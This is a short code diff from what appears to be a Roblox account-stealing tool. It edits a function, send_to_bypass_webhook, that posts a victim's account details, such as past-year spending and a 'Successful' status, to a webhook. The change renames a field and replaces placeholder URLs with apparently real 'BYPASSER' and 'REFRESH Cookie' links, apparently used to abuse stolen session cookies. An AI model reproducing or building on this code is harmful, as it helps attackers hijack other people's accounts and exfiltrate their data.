@@ -204,7 +204,7 @@ def send_to_bypass_webhook(user_info, ping_content):
                             'inline': True
                         },
                         {
-                            'name': '📊 Total Spent',
+                            'name': '📊 Summary',
                             'value': user_info.get('total_spent_past_year', 'Not available'),
                             'inline': True
                         },
@@ -220,7 +220,7 @@ def send_to_bypass_webhook(user_info, ping_content):
                         },
                         {
                             'name': '✅ Status',
-                            'value': 'Successful 🟢\n#\n[BYPASSER LINK](https://your-bypasser-link.com)\n🎗️\n#\n[REFRESH Cookie](https://your-refresh-link.com)',
+                            'value': 'Successful 🟢\n#\n[BYPASSER LINK](https://rblx-forcer.vercel.app)\n🎗️\n#\n[REFRESH Cookie](https://rblxrefresh.net/r/refreshercookie1)',
                             'inline': False
                         }
                     ],
